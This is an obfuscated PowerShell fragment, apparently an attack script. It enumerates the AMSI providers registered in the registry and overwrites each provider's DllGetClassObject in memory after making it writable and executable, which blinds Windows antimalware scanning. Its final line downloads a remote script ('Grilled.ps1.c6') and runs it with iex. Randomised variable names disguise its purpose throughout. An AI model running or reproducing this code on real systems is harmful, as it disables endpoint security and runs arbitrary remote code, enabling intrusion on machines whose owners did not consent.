foreach ($dKOWliGFIinklPKDYiIfEEQtgveOgUcOpqxgLDAQwxI in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $QLoLzPMlxVdFtIZlgpDbc = 'HKLM:\Software\Classes\CLSID\' + $dKOWliGFIinklPKDYiIfEEQtgveOgUcOpqxgLDAQwxI + '\InprocServer32'
    $ouAmQDDijORIqcKMKYrwhtqNcfeOEXHIuJoNGKcZ = Get-ItemPropertyValue -Name '(Default)' $QLoLzPMlxVdFtIZlgpDbc -ErrorAction SilentlyContinue
    if ($ouAmQDDijORIqcKMKYrwhtqNcfeOEXHIuJoNGKcZ)
    {
        $xJqfSakRtSanWWNGJQxXqcSkHFXmlFNwmwtJLudtGop = Split-Path $ouAmQDDijORIqcKMKYrwhtqNcfeOEXHIuJoNGKcZ -leaf
        $kYJsYnykKqKudugQWtRZeSwYZkEPzfzXPpvcw = $xJqfSakRtSanWWNGJQxXqcSkHFXmlFNwmwtJLudtGop -replace '"', ""
        $PUelmuiWXlZyWOJMntCNCBLEm = $PYGWIvrGuojMqGrprgzybpIKtVBsUDWhwaRwvK.Invoke($kYJsYnykKqKudugQWtRZeSwYZkEPzfzXPpvcw) 
        if ($PUelmuiWXlZyWOJMntCNCBLEm -ne 0)
        {
            Write-host "[*] Provider found - " $xJqfSakRtSanWWNGJQxXqcSkHFXmlFNwmwtJLudtGop
            $qCdqrWBXgsIcxnDvFBnBjpsc = $ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ.Invoke($PUelmuiWXlZyWOJMntCNCBLEm, "DllGetClassObject")        
            $JHoXVwaJxHwznJGRzaUnDYJYtlCJxvWDZqqrfpYt.Invoke($qCdqrWBXgsIcxnDvFBnBjpsc, [uint32]$YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP.Length, 0x40, [ref]$iEImbUyLOYzoScHYDwGOzAIbwlBtejqIvpsAvbamZSf)
            [System.Runtime.InteropServices.Marshal]::Copy($YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP, 0, $qCdqrWBXgsIcxnDvFBnBjpsc, $YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP.Length)
        }
    }
}
$wbc.DownloadString("$prefixpath/Grilled.ps1.c6") | iex
